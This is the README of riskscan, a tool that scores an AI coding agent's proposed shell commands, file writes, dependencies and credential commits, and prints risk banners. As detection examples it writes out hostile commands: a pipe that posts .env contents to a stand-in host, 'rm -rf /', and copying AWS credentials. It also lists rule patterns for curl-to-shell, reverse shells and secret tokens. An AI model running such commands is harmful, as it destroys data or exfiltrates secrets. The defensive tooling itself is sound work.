# riskscan

A second pair of eyes for your AI coding agent. `riskscan` scores every action the
agent proposes — a shell command, a file write, a dependency it pulls in, a credential
about to be committed — and prints
**one traffic-light banner** before it runs.

It **never blocks**. It warns you, and it hands the same analysis back to the agent so
the model can reconsider. You (or the agent) still decide. The point isn't to gate every
action — it's to widen your auto-approve allowlist *without going blind*, because the
risky minority still gets flagged.

```
🔴 10/10 DANGER — riskscan [bash]
  • [sh-guard] Pipeline: File read: accessing secrets (.env) | Sensitive file content sent to network [MITRE T1005] [10/10]
  • [builtin:bash] read-only / print [1/10]
```

## Quickstart

Try it in ten seconds — no install, no config. Clone and score a command:
```
git clone https://github.com/xvirgov/riskscan && cd riskscan
python3 adapters/claude_code.py --command "rm -rf /"     # 🔴 10/10, builtin only
python3 adapters/claude_code.py --doctor                 # which analyzers are installed
```

Install it as a Claude Code plugin (the hook loads in a new session):
```
/plugin marketplace add xvirgov/riskscan
/plugin install riskscan@riskscan
```

Add whatever optional analyzers you want — `builtin` needs nothing, the rest are bring-your-own-binary:
```
brew install osv-scanner        # dependency CVEs
pipx install guarddog bandit    # malicious packages + Python SAST
```
`--doctor` shows what's found and what's still missing. To enable/disable analyzers or tune scores, copy `riskscan/config.default.json` → `riskscan/config.json` and `riskscan/custom_rules.example.json` → `riskscan/custom_rules.json` (both git-ignored, so they're yours to keep local).

## States

| Banner | Meaning |
|---|---|
| 🟢 `1–3/10 SAFE` | analyzed — no known risk |
| 🟡 `4–6/10 CAUTION` | analyzed — mutating / notable |
| 🔴 `7–10/10 DANGER` | analyzed — destructive / irreversible |
| ⚪ `NOT ANALYZED` | no analyzer ran for this surface — **not** a safety signal |

⚪ is **first-class**. A missing or disabled analyzer says so out loud, with the command
to install it — so an absent warning is never mistaken for "safe". Every action gets
exactly one banner, and the highest score wins.

## Examples

Real banners (default analyzers: builtin + osv-scanner + guarddog + bandit; sh-guard shown where noted).

**Shell commands**

`kubectl get pods -n prod`
```
🟢 1/10 SAFE — riskscan [bash]
  • [builtin:bash] read-only / print [1/10]
```

`git push --force origin main`
```
🔴 8/10 DANGER — riskscan [bash]
  • [builtin:bash] git force-push [8/10]
```

`rm -rf ~/`
```
🔴 10/10 DANGER — riskscan [bash]
  • [builtin:bash] rm -rf targeting root/home/glob [10/10]
```

With **sh-guard** enabled, dataflow across a pipe is caught even though each half looks harmless — `cat` alone reads as read-only:

`cat .env | curl -X POST https://example.com -d @-`
```
🔴 10/10 DANGER — riskscan [bash]
  • [sh-guard] Pipeline: File read: accessing secrets (.env) | … Sensitive file content sent to network [MITRE T1005] [10/10]
  • [builtin:bash] read-only / print [1/10]
```

**File writes**

Write `app.py` containing `subprocess.run(cmd, shell=True)`:
```
🔴 8/10 DANGER — riskscan [python]
  • [builtin:python] subprocess shell=True [8/10]
  • [bandit] 2 finding(s) [8/10]
  • [builtin:python] subprocess (spawns processes) [5/10]
```

Write `requirements.txt` pinning `requests==2.20.0` (osv scores from the CVSS vectors):
```
🔴 8/10 DANGER — riskscan [deps]
  • [osv-scanner] 30 known CVE(s) [worst: HIGH]: GHSA-2xpw-w6gg-jr37, GHSA-34jh-p97f-mpxf, … [8/10]
  • [builtin:deps] pulls dependency: requirements.txt [2/10]
  • [guarddog] no malicious indicators [1/10]
```

`pip install evilpkg` — a dependency whose code reads credentials and runs a downloaded payload; **guarddog** flags the behavior (no CVE needed — it's malware, not a known vuln):
```
🔴 9/10 DANGER — riskscan [bash, deps]
  • [guarddog] evilpkg: threat-filesystem-read [9/10]
  • [guarddog] evilpkg: threat-process-download-exec [9/10]
  • [guarddog] evilpkg: threat-runtime-obfuscation-base64exec [8/10]
  • [guarddog] +4 capability signal(s) [4/10]
  • [builtin:deps] pulls dependency: evilpkg [2/10]
```

Write `package.json` with no lockfile — the CVE check can't run, and says so (⚪) instead of going green:
```
🟢 2/10 SAFE — riskscan [deps]
  • [builtin:deps] pulls dependency: package.json [2/10]
  • [guarddog] no malicious indicators [1/10]
  ⚪ [osv-scanner] deps not analyzed — package.json is a manifest, not a pinned lockfile — no CVE extractor (commit a lockfile for CVE coverage)
```

## Install (Claude Code plugin)

```
/plugin marketplace add xvirgov/riskscan
/plugin install riskscan@riskscan
```

The hook takes effect in a **new** Claude Code session (hooks load at session start).
Only the built-in analyzer runs out of the box; the optional analyzers below report ⚪
with an install hint until you add them.

### Manual wiring (any hook-capable setup)

If you'd rather not use the plugin system, clone the repo and point a `PreToolUse` hook
at the adapter in your `settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash|Write|Edit|MultiEdit",
        "hooks": [ { "type": "command", "command": "python3 /path/to/riskscan/adapters/claude_code.py" } ] }
    ]
  }
}
```

## Analyzers

Only **builtin** is required; the rest are optional and bring-your-own-binary. Each is a
single declarative entry in `riskscan/analyzers.json` (surface, detect, run, parse,
install hint) — adding one is one entry plus its binary.

| Analyzer | Surface | What it adds | Install |
|---|---|---|---|
| **builtin** | bash, deps, py/js, secrets | zero-dependency regex rule pack (rm -rf, force-push, `kubectl delete`, `terraform destroy`, `curl\|sh`, SQL DROP, sudo, plus a python/js reverse-shell combo heuristic and the [secrets](#secrets--whats-about-to-enter-version-control) pack) | — (always on) |
| **sh-guard** | bash | AST classifier with pipeline **taint analysis** + MITRE ATT&CK mapping | py3.12 lib — see `analyzers.json` |
| **osv-scanner** | deps | CVEs from a **pinned lockfile** (unpinned manifests report ⚪) | `brew install osv-scanner` |
| **guarddog** | deps | malicious-package heuristics (exfil, install-scripts, typosquats) | `pipx install guarddog` |
| **gitleaks** | secrets | 170+ maintained credential rules over the same changeset, with `.gitleaks.toml` allowlisting | `brew install gitleaks` |
| **bandit** | python | source SAST for written `.py` files | `pipx install bandit` |

Enable/disable in `riskscan/config.default.json`. `on_missing: suggest` shows the ⚪
install hint; set it to `silent` to hide unavailable analyzers. `ask_threshold` (default
7) is the score at or above which the banner is surfaced at the approval prompt.

## Scoring — what each analyzer emits, and how it maps

Every analyzer is normalized onto one abstract, consequence-based 1–10 scale. The
**highest score wins**, and a band means the same thing no matter which analyzer produced it:

| Band | Meaning |
|---|---|
| **1–3 SAFE** | read-only / reversible / no known issue |
| **4–6 CAUTION** | mutating but recoverable; notable but not dangerous |
| **7–8 DANGER** | destructive / irreversible, or confirmed-dangerous |
| **9–10 CRITICAL** | catastrophic at scale; confirmed exfil; critical CVE |

The scale is deliberately abstract so results compare across tools that each speak a
different native language:

| Analyzer | What it emits | How riskscan maps it to 1–10 |
|---|---|---|
| **builtin** | nothing — it *is* the scorer | hand-tuned `(regex, score, label)` rules, calibrated to the bands above |
| **sh-guard** | a `score` 0–100, a `level`, and MITRE ATT&CK technique IDs | linear rescale `round(score/10)`; the top ATT&CK id is appended to the label |
| **osv-scanner** | one or more **CVSS vectors** per CVE (occasionally a coarse label) | compute the CVSS **base score** from the vector → band (critical→9, high→8, medium→6, low→4), **capped at 9** (a CVE's presence ≠ a reachable exploit) |
| **guarddog** | matched **rule names** only — no number | rule taxonomy: `threat-*`→8–9, typosquat→9, metadata→6, `capability-*`→4 |
| **bandit** | `issue_severity` + `issue_confidence` + a CWE id | severity → 8 / 5 / 3 (high / medium / low) |

Two notes: **sh-guard** runs hot — it rates any `rm -rf <path>` critical, so it tends
to set the ceiling — and **bandit** currently uses severity only; its confidence field is
available but not yet folded in. The number a rule carries is a *policy choice* — your
opinion of how much that class of action deserves attention — versioned in a diff, not a
model's mood.

## Secrets — what's about to enter version control

`git add -A` is the moment an agent can commit a credential nobody looked at, so the
`secrets` surface scans **content, not the command**. Two entry points:

- **Any file write or edit** — the written text is scanned before it reaches disk, which
  catches the credential one step earlier than git does.
- **A git command that moves content into version control.** At PreToolUse time nothing is
  staged yet, so `gitleaks protect --staged` would have nothing to look at; riskscan derives
  the candidate file set from the working tree instead.

| Command | What gets scanned |
|---|---|
| `git add …` | `git add -n` — exactly what that pathspec would stage, `.gitignore` respected |
| `git commit -a` | tracked files modified in the working tree |
| `git commit` | what is already staged |
| `git push` | files changed in `@{upstream}..HEAD` |

```
🔴 9/10 DANGER — riskscan [bash, secrets]
  • [builtin:secrets] AWS access key id — deploy/.env:1 (staged) [9/10]
  • [builtin:secrets] AWS secret access key — deploy/.env:2 (staged) [9/10]
  • [builtin:secrets] connection string with inline password — deploy/.env:3 (staged) [8/10]
```

**A finding never quotes the secret.** The banner is echoed into the agent's transcript, the
hook log and the model's context, so printing the match would create the exposure this
surface exists to prevent. Rule label, file and line — nothing else; `tests/test_engine.py`
asserts it.

Two tiers, so interruptions land where they are earned:

- **9** — an unambiguous shape: cloud key id, PEM private-key block, provider-prefixed token
  (`ghp_`, `github_pat_`, `glpat-`, `xox…`, `sk_live_`, `AIza…`, `hvs.`, `npm_`, `SG.`). Above
  `ask_threshold`, so it reaches the approval prompt.
- **6** — a generic `name = value` assignment (quoted or bare — YAML and `.env` usually leave
  the value bare, and the same credential must not score differently for its quoting) where the
  name looks credential-ish *and* the value looks random: Shannon entropy ≥ 4.0 plus three of
  four character classes. `password = "changeme"`, `token = "${VAULT_TOKEN}"`,
  `{{ .Values.secret }}`, hex digests, URIs and kebab-case slugs (`my-app-tls-secret`) stay green
  on purpose.

Both tiers also run over anything **base64** hid from them — a Kubernetes `Secret`, a sealed
manifest or a CI variable carries key material encoded, and every plaintext rule is blind to it.
Runs of 60+ base64 chars are decoded (up to 8 per file) and rescanned, reported at the encoded
blob's line:

```
🔴 9/10 DANGER — riskscan [bash, secrets]
  • [builtin:secrets] private key block — id_ed25519:1 (staged) [9/10]
  • [builtin:secrets] private key block — id_rsa_pem:1 (staged) [9/10]
  • [builtin:secrets] private key block (base64-encoded) — sealed-secret.yaml:6 (staged) [9/10]
  • [builtin:secrets] high-entropy value assigned to `password` — values.yaml:2 (staged) [6/10]
```

### gitleaks on the same surface

The builtin pack is the zero-dependency floor; **gitleaks** (if installed) scans the identical
file slice and reports alongside it. They are complements, not substitutes, and a real run shows
why: the builtin catches `AKIA…` key ids that gitleaks' default config allowlists, while gitleaks
brings 170+ provider rules the builtin has never heard of.

Two integration details worth knowing:

- **`gitleaks git --staged` does not fit a pre-execution hook.** It reads the index, which is still
  empty when `git add` is the command *about to run*. (It fits a `pre-commit` hook perfectly — that
  is what it is for.) riskscan instead materializes the resolved changeset into a tempdir and runs
  `gitleaks dir`, so the write surface and all four git keys take one code path.
- **`--redact` is not optional.** gitleaks' JSON carries the credential in `Secret`/`Match`;
  `--redact` scrubs the report itself, so the value never enters riskscan's process, its log, the
  banner or the model's context. The tempdir prefix is stripped from reported paths too.

Public key material is deliberately green — `*.pub`, `known_hosts` and `ssh_config` carry no
secret. A passphrase-protected private key is **not** green: the passphrase is brute-forcible
once the file is in history.

### Two layers, and why the git one blocks

The agent layer is handed a *command string* and has to predict what a shell will do to the
filesystem. That prediction is unbounded — subshells, `env -C`, `$PWD`, symlinked repos — and
every gap in it is a silent false green. A git hook has no such problem: git runs it **inside**
the repository with the index already built, so "which tree, which files, which content" are
facts. So the two layers divide by what they can know, not by what they scan:

| Layer | Sees | Catches uniquely | Verdict |
|---|---|---|---|
| PreToolUse (`claude_code.py`) | proposed *content*, before the file exists | secrets that never reach git; warns before the agent acts | advisory |
| `pre-commit` (`git_hook.py --staged`) | the actual index, via `git show :<path>` | non-Write arrivals (`cp ~/.aws/credentials .`), **partial stages** (`git add -p`), your own manual commits | **blocks** |
| `pre-push` (`git_hook.py --pre-push`) | the pushed range, from git's stdin | a secret committed and later removed — still in the history being pushed | **blocks** |

```bash
python3 adapters/git_hook.py --install --global   # ~/.githooks + core.hooksPath
python3 adapters/git_hook.py --status
python3 adapters/git_hook.py --uninstall --global

python3 scripts/demo-secrets.py          # see both layers, with and without the hooks
python3 scripts/demo-secrets.py agent    # just the advisory layer
python3 scripts/demo-secrets.py git      # just the blocking layer
```

The demo builds throwaway repos, forces the hook state in-process (so the comparison is honest
whatever your `core.hooksPath` says, and running it never changes anything), and deletes them.

The global install **chains** rather than clobbers: `core.hooksPath` overrides `.git/hooks`, which
would otherwise silently disable the pre-commit framework in every repo that uses it, so the
generated hook execs a repo-local hook first (via `--absolute-git-dir`, never `--git-path hooks`,
which would resolve back to itself). Blocks at `secrets.block_threshold` (default 9 — tier-1
shapes only; the entropy tier warns and passes). Bypass: `--no-verify` or `RISKSCAN_SKIP=1`.

Consequences of that split, by design:

- **An *unchecked* version-control write scores 10/10.** With no hooks installed, the agent layer
  is the only thing looking, so `git add`/`commit`/`push` are top-of-scale regardless of findings
  (`secrets.unchecked_write_score`). Once the hooks are installed that stops: they block at commit
  and push on the actual index, so the synthetic score would fire on every routine commit while
  adding nothing — the same question that silences the ⚪ handoff retires it. Read-only git
  (`status`, `log`, `diff`, `show`) is 1/10 either way.

  ```
  hooks absent,  git commit (clean)      -> 🔴 10/10  nothing downstream will check this
  hooks present, git commit (clean)      -> 🟡  4/10  silent pass
  hooks present, git commit (credential) -> 🔴  9/10  prompt, credential bullet first
  ```
- **A directory change is no longer predicted.** `cd`, `pushd`, a subshell, `env -C` or a variable
  target means the agent layer does not resolve the tree at all. With the hooks installed it says
  nothing (the handoff is covered); without them it reads ⚪ with an install hint.
- Over a *range*, the builtin's line numbers are approximate — several commits' added lines are
  synthesized into one view. gitleaks' per-commit numbers are exact; both are reported.

### Limits, in the order you'll hit them

- On the git surface, fixture and vendored trees (`tests/`, `fixtures/`, `vendor/`,
  `node_modules/`, `*.example`, lockfiles) are skipped, and the scan is capped at 40 files /
  256KB each — tune `secrets.skip_paths` and `secrets.max_files` in config. A single-file
  **write** is never path-skipped; the entropy gate does that job instead.
- A changeset it cannot read reads ⚪ NOT ANALYZED — never green. Resolving the *wrong* tree would
  report a confident green for a changeset nobody looked at, which is strictly worse than
  admitting ignorance.
- For `Edit`/`MultiEdit` the line number is relative to the edited fragment, not the file.

## Custom rules

Add or override built-in rules without touching code: copy
`riskscan/custom_rules.example.json` to `riskscan/custom_rules.json` and edit.

```json
{
  "bash":    [ ["\\bnpm\\s+publish\\b", 7, "npm publish (releases a package)"] ],
  "python":  [ ["\\brequests\\.post\\s*\\(", 4, "outbound POST"] ],
  "js":      [],
  "secrets": [ ["\\bINTERNAL-[A-Z0-9]{12}\\b", 9, "internal service credential"] ]
}
```

Each rule is `[regex, score 1-10, label]` (Python `re` syntax; JSON needs backslashes
doubled). Rules are appended to the built-in packs and the highest score wins — so a custom
rule can only **raise** an action's score, never hide a built-in finding. An invalid regex is
skipped, never fatal.

## How it's built

The engine is runtime-agnostic; the Claude-specific glue is a thin adapter.

```
riskscan/
  engine.py            # runtime-blind: analyzers, 1–10 scoring, aggregation, fail-loud logic
  analyzers.json       # declarative adapter per external analyzer
  config.default.json  # which analyzers are enabled + thresholds
adapters/
  claude_code.py       # maps a Claude Code PreToolUse payload ↔ engine, emits the hook response
.claude-plugin/        # plugin.json + marketplace.json (makes it /plugin install-able)
hooks/hooks.json       # PreToolUse: Bash|Write|Edit|MultiEdit → adapters/claude_code.py
```

`engine.analyze(action)` takes a normalized action (`command` or `write`) and returns a
scored report; `render_banner()` / `render_agent_context()` render it. Supporting another
agent runtime is a new file in `adapters/` that maps that runtime's hook payload to an
action — no engine changes.

## Design principles

- **Warn, don't block.** Blocking breeds bypasses; informing both the human and the model
  is the agentic-era pattern.
- **Fail loud.** The absence of a warning must never read as safe — ⚪ names what wasn't
  checked and how to check it.
- **Deterministic engine.** Scores are explicit, versioned, and reviewable in a diff — not
  a model rating its own output. The number a rule carries is *your* opinion about how much
  that class of action deserves attention; every rule is one `(regex, score, label)` line.
- **Right tool per threat.** Heuristics (builtin) → CVEs (osv, needs pinned versions) →
  malware behavior (guarddog) → source SAST (bandit). One scanner doesn't fit every threat.

## License

Apache-2.0.
